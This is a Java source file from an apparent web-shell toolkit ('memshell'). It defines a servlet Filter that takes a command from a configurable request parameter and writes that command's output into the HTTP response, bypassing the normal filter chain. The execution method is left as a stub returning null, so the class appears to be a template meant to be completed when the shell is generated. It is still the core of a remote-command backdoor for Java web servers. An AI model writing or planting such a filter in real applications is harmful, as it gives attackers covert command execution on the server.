package com.reajason.javaweb.memshell.shelltool.command;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class CommandFilter implements Filter {
    private static String paramName;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String cmd) throws Exception {
        return null;
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest servletRequest = (HttpServletRequest) request;
        HttpServletResponse servletResponse = (HttpServletResponse) response;
        String cmd = getParam(servletRequest.getParameter(paramName));
        try {
            if (cmd != null) {
                InputStream inputStream = getInputStream(cmd);
                ServletOutputStream outputStream = servletResponse.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        chain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}